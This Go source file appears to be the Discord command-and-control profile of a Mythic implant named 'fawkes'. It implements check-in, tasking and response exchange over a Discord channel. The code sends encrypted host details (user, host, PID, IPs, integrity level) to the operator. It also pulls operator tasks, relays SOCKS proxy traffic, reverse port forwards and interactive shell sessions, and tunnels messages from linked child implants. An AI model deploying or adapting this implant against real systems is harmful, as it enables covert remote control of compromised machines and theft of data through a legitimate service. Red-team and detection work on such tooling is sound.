package discord

import (
	"encoding/json"
	"fmt"
	"log"
	"time"

	"fawkes/pkg/structs"
)

// ─── Profile Interface Methods ───────────────────────────────────────────────

// Checkin performs the initial checkin with Mythic via the Discord channel.
func (d *DiscordProfile) Checkin(agent *structs.Agent) error {
	// Store payload UUID for matching push C2 messages from Mythic
	d.PayloadUUID = agent.PayloadUUID

	cfg := d.getConfig()
	if cfg == nil {
		return fmt.Errorf("failed to decrypt Discord configuration")
	}

	checkinMsg := structs.CheckinMessage{
		Action:       "checkin",
		PayloadUUID:  agent.PayloadUUID,
		User:         agent.User,
		Host:         agent.Host,
		PID:          agent.PID,
		OS:           agent.OS,
		Architecture: agent.Architecture,
		Domain:       agent.Domain,
		IPs:          []string{agent.InternalIP},
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Integrity:    agent.Integrity,
	}

	body, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin message: %w", err)
	}

	// Encrypt and format as Freyja-style: UUID + encrypted_body, then base64
	mythicMessage, err := d.buildMythicMessage(body, agent.PayloadUUID, cfg.EncryptionKey)
	if err != nil {
		return err
	}

	// Send via Discord and poll for response
	responseMessage, err := d.sendAndPoll(mythicMessage, agent.PayloadUUID, cfg)
	if err != nil {
		return fmt.Errorf("checkin via Discord failed: %w", err)
	}

	// Decrypt the response
	decrypted, err := d.unwrapResponse(responseMessage, cfg.EncryptionKey)
	if err != nil {
		return fmt.Errorf("failed to decrypt checkin response: %w", err)
	}

	// Parse checkin response to extract callback UUID
	var checkinResponse map[string]interface{}
	if err := json.Unmarshal(decrypted, &checkinResponse); err != nil {
		return fmt.Errorf("failed to parse checkin response: %w", err)
	}

	if callbackID, exists := checkinResponse["id"]; exists {
		if callbackStr, ok := callbackID.(string); ok {
			d.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
		if callbackStr, ok := callbackUUID.(string); ok {
			d.UpdateCallbackUUID(callbackStr)
			log.Printf("session: %s", callbackStr)
		}
	} else {
		log.Printf("no session id, using default")
		d.UpdateCallbackUUID(agent.PayloadUUID)
	}

	return nil
}

// GetTasking retrieves tasks and inbound SOCKS data from Mythic via Discord.
func (d *DiscordProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	cfg := d.getConfig()
	if cfg == nil {
		return nil, nil, fmt.Errorf("failed to decrypt Discord configuration")
	}

	activeUUID := d.getActiveUUID(agent, cfg)

	taskingMsg := structs.TaskingMessage{
		Action:      "get_tasking",
		TaskingSize: -1,
		Socks:       outboundSocks,
		PayloadUUID: activeUUID,
		PayloadType: "fawkes",
		C2Profile:   "discord",
	}

	// Collect delegate messages from linked P2P children
	if d.GetDelegatesOnly != nil {
		delegates := d.GetDelegatesOnly()
		if len(delegates) > 0 {
			taskingMsg.Delegates = delegates
		}
	}

	// Collect rpfwd outbound messages
	if d.GetRpfwdOutbound != nil {
		rpfwdMsgs := d.GetRpfwdOutbound()
		if len(rpfwdMsgs) > 0 {
			taskingMsg.Rpfwd = rpfwdMsgs
		}
	}

	// Collect interactive outbound messages (PTY output)
	if d.GetInteractiveOutbound != nil {
		interactiveMsgs := d.GetInteractiveOutbound()
		if len(interactiveMsgs) > 0 {
			taskingMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(taskingMsg)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to marshal tasking message: %w", err)
	}

	mythicMessage, err := d.buildMythicMessage(body, activeUUID, cfg.EncryptionKey)
	if err != nil {
		return nil, nil, err
	}

	var tasks []structs.Task
	var inboundSocks []structs.SocksMsg

	// Drain any pushed tasks that PostResponse buffered. PostResponse may
	// accidentally consume pushed tasks from the channel (the server uses
	// callback UUID as client_id for ALL messages, making them
	// indistinguishable at the wrapper level). Those messages are buffered
	// in pendingMessages and drained here.
	d.pendingMu.Lock()
	buffered := d.pendingMessages
	d.pendingMessages = nil
	d.pendingMu.Unlock()
	for _, msg := range buffered {
		decData, decErr := d.unwrapResponse(msg, cfg.EncryptionKey)
		if decErr != nil {
			continue
		}
		var taskResp map[string]interface{}
		if json.Unmarshal(decData, &taskResp) == nil {
			if taskList, exists := taskResp["tasks"]; exists {
				if taskArray, ok := taskList.([]interface{}); ok {
					for _, taskData := range taskArray {
						if taskMap, ok := taskData.(map[string]interface{}); ok {
							task := structs.NewTask(
								getString(taskMap, "id"),
								getString(taskMap, "command"),
								getString(taskMap, "parameters"),
							)
							tasks = append(tasks, task)
						}
					}
				}
			}
		}
	}
	if len(buffered) > 0 && d.Debug {
		log.Printf("GetTasking: drained %d buffered messages, got %d tasks", len(buffered), len(tasks))
	}

	// Pre-poll sweep: check for any pushed tasks already in the Discord channel
	// before sending get_tasking. In push C2, Mythic may push tasks between
	// GetTasking cycles that haven't been collected yet.
	prePollMsgs, err := d.getMessages(cfg, 100)
	if err == nil {
		for _, msg := range prePollMsgs {
			respWrapper, parseErr := d.parseDiscordMessage(msg, cfg)
			if parseErr != nil {
				continue
			}
			// Match pushed tasks using callback UUID (senderID match)
			if !respWrapper.ToServer && (respWrapper.ClientID == activeUUID ||
				respWrapper.SenderID == activeUUID ||
				(d.PayloadUUID != "" && respWrapper.ClientID == d.PayloadUUID)) {
				d.deleteMessage(msg.ID, cfg)
				// Process the pushed task immediately
				decData, decErr := d.unwrapResponse(respWrapper.Message, cfg.EncryptionKey)
				if decErr != nil {
					continue
				}
				var taskResp map[string]interface{}
				if json.Unmarshal(decData, &taskResp) == nil {
					if taskList, exists := taskResp["tasks"]; exists {
						if taskArray, ok := taskList.([]interface{}); ok {
							for _, taskData := range taskArray {
								if taskMap, ok := taskData.(map[string]interface{}); ok {
									task := structs.NewTask(
										getString(taskMap, "id"),
										getString(taskMap, "command"),
										getString(taskMap, "parameters"),
									)
									tasks = append(tasks, task)
								}
							}
						}
					}
				}
			}
		}
	}

	// Use sendAndPollAll to collect ALL matching messages. In push C2, the channel
	// may contain both the get_tasking response (empty tasks) AND pushed task messages.
	responseMessages, err := d.sendAndPollAll(mythicMessage, activeUUID, cfg)
	if err != nil {
		// If sendAndPollAll fails but we found pre-poll tasks, return those
		if len(tasks) > 0 {
			if d.Debug {
				log.Printf("GetTasking: sendAndPollAll failed but %d pre-poll tasks found", len(tasks))
			}
			return tasks, nil, nil
		}
		return nil, nil, fmt.Errorf("get tasking via Discord failed: %w", err)
	}

	// Process ALL returned messages — merge tasks from each
	for i, responseMessage := range responseMessages {
		decryptedData, err := d.unwrapResponse(responseMessage, cfg.EncryptionKey)
		if err != nil {
			if d.Debug {
				log.Printf("GetTasking: decrypt failed for message %d/%d: %v", i+1, len(responseMessages), err)
			}
			continue
		}

		var taskResponse map[string]interface{}
		if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
			if d.Debug {
				log.Printf("GetTasking: JSON parse failed for message %d/%d: %v", i+1, len(responseMessages), err)
			}
			continue
		}

		// Extract tasks from this message
		if taskList, exists := taskResponse["tasks"]; exists {
			if taskArray, ok := taskList.([]interface{}); ok {
				for _, taskData := range taskArray {
					if taskMap, ok := taskData.(map[string]interface{}); ok {
						task := structs.NewTask(
							getString(taskMap, "id"),
							getString(taskMap, "command"),
							getString(taskMap, "parameters"),
						)
						tasks = append(tasks, task)
					}
				}
			}
		}

		// Extract SOCKS messages from this message
		if socksList, exists := taskResponse["socks"]; exists {
			if socksRaw, err := json.Marshal(socksList); err == nil {
				var socks []structs.SocksMsg
				if err := json.Unmarshal(socksRaw, &socks); err == nil {
					inboundSocks = append(inboundSocks, socks...)
				}
			}
		}

		// Route rpfwd messages from this message
		if d.HandleRpfwd != nil {
			if rpfwdList, exists := taskResponse["rpfwd"]; exists {
				if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
					var rpfwdMsgs []structs.SocksMsg
					if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
						d.HandleRpfwd(rpfwdMsgs)
					}
				}
			}
		}

		// Route interactive messages from this message
		if d.HandleInteractive != nil {
			if interactiveList, exists := taskResponse["interactive"]; exists {
				if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
					var interactiveMsgs []structs.InteractiveMsg
					if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
						d.HandleInteractive(interactiveMsgs)
					}
				}
			}
		}

		// Route delegate messages from this message
		if d.HandleDelegates != nil {
			if delegateList, exists := taskResponse["delegates"]; exists {
				if delegateRaw, err := json.Marshal(delegateList); err == nil {
					var delegates []structs.DelegateMessage
					if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
						d.HandleDelegates(delegates)
					}
				}
			}
		}
	}

	if d.Debug {
		log.Printf("GetTasking: processed %d messages, got %d tasks", len(responseMessages), len(tasks))
	}
	return tasks, inboundSocks, nil
}

// PostResponse sends a response back to Mythic via Discord.
func (d *DiscordProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	cfg := d.getConfig()
	if cfg == nil {
		return nil, fmt.Errorf("failed to decrypt Discord configuration")
	}

	activeUUID := d.getActiveUUID(agent, cfg)

	responseMsg := structs.PostResponseMessage{
		Action:    "post_response",
		Responses: []structs.Response{response},
		Socks:     socks,
	}

	// Collect rpfwd outbound messages
	if d.GetRpfwdOutbound != nil {
		rpfwdMsgs := d.GetRpfwdOutbound()
		if len(rpfwdMsgs) > 0 {
			responseMsg.Rpfwd = rpfwdMsgs
		}
	}

	// Collect delegate messages and edge notifications
	if d.GetDelegatesAndEdges != nil {
		delegates, edges := d.GetDelegatesAndEdges()
		if len(delegates) > 0 {
			responseMsg.Delegates = delegates
		}
		if len(edges) > 0 {
			responseMsg.Edges = edges
		}
	}

	// Collect interactive outbound messages
	if d.GetInteractiveOutbound != nil {
		interactiveMsgs := d.GetInteractiveOutbound()
		if len(interactiveMsgs) > 0 {
			responseMsg.Interactive = interactiveMsgs
		}
	}

	body, err := json.Marshal(responseMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal response message: %w", err)
	}

	mythicMessage, err := d.buildMythicMessage(body, activeUUID, cfg.EncryptionKey)
	if err != nil {
		return nil, err
	}

	// Use sendAndPollAll to collect ALL matched messages. The Discord C2 server
	// uses the callback UUID as client_id for every response (it doesn't echo
	// per-exchange IDs), so pushed tasks and PostResponse acks are
	// indistinguishable at the wrapper level. We collect all, find our ack,
	// and buffer any pushed tasks for GetTasking.
	allResults, err := d.sendAndPollAll(mythicMessage, activeUUID, cfg)
	if err != nil {
		if d.Debug {
			log.Printf("PostResponse: first attempt failed: %v, retrying...", err)
		}
		time.Sleep(time.Duration(d.PollInterval) * time.Second)
		allResults, err = d.sendAndPollAll(mythicMessage, activeUUID, cfg)
		if err != nil {
			return nil, fmt.Errorf("post response via Discord failed (after retry): %w", err)
		}
	}

	// Separate our PostResponse ack from any accidentally consumed pushed tasks.
	// Pushed tasks contain a non-empty "tasks" array; PostResponse acks don't.
	var responseData string
	var extraMessages []string
	for _, msg := range allResults {
		decData, decErr := d.unwrapResponse(msg, cfg.EncryptionKey)
		if decErr != nil {
			continue
		}
		var parsed map[string]interface{}
		if json.Unmarshal(decData, &parsed) != nil {
			continue
		}
		if taskList, exists := parsed["tasks"]; exists {
			if taskArray, ok := taskList.([]interface{}); ok && len(taskArray) > 0 {
				// This is a pushed task, not our PostResponse ack — buffer it
				extraMessages = append(extraMessages, msg)
				continue
			}
		}
		if responseData == "" {
			responseData = msg // First non-task message is our PostResponse ack
		} else {
			extraMessages = append(extraMessages, msg) // Extra non-task messages also buffered
		}
	}

	// Buffer any accidentally consumed messages for GetTasking to drain
	if len(extraMessages) > 0 {
		d.pendingMu.Lock()
		d.pendingMessages = append(d.pendingMessages, extraMessages...)
		d.pendingMu.Unlock()
		if d.Debug {
			log.Printf("PostResponse: buffered %d pushed messages for GetTasking", len(extraMessages))
		}
	}

	if responseData == "" {
		return nil, fmt.Errorf("no PostResponse ack found among %d matched messages", len(allResults))
	}

	decryptedData, err := d.unwrapResponse(responseData, cfg.EncryptionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt PostResponse: %w", err)
	}

	// Route any PostResponse data (delegates, rpfwd, interactive)
	if len(decryptedData) > 0 {
		var postRespData map[string]interface{}
		if err := json.Unmarshal(decryptedData, &postRespData); err == nil {
			if d.HandleRpfwd != nil {
				if rpfwdList, exists := postRespData["rpfwd"]; exists {
					if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
						var rpfwdMsgs []structs.SocksMsg
						if err := json.Unmarshal(rpfwdRaw, &rpfwdMsgs); err == nil && len(rpfwdMsgs) > 0 {
							d.HandleRpfwd(rpfwdMsgs)
						}
					}
				}
			}
			if d.HandleDelegates != nil {
				if delegateList, exists := postRespData["delegates"]; exists {
					if delegateRaw, err := json.Marshal(delegateList); err == nil {
						var delegates []structs.DelegateMessage
						if err := json.Unmarshal(delegateRaw, &delegates); err == nil && len(delegates) > 0 {
							d.HandleDelegates(delegates)
						}
					}
				}
			}
			if d.HandleInteractive != nil {
				if interactiveList, exists := postRespData["interactive"]; exists {
					if interactiveRaw, err := json.Marshal(interactiveList); err == nil {
						var interactiveMsgs []structs.InteractiveMsg
						if err := json.Unmarshal(interactiveRaw, &interactiveMsgs); err == nil && len(interactiveMsgs) > 0 {
							d.HandleInteractive(interactiveMsgs)
						}
					}
				}
			}
		}
	}

	return decryptedData, nil
}
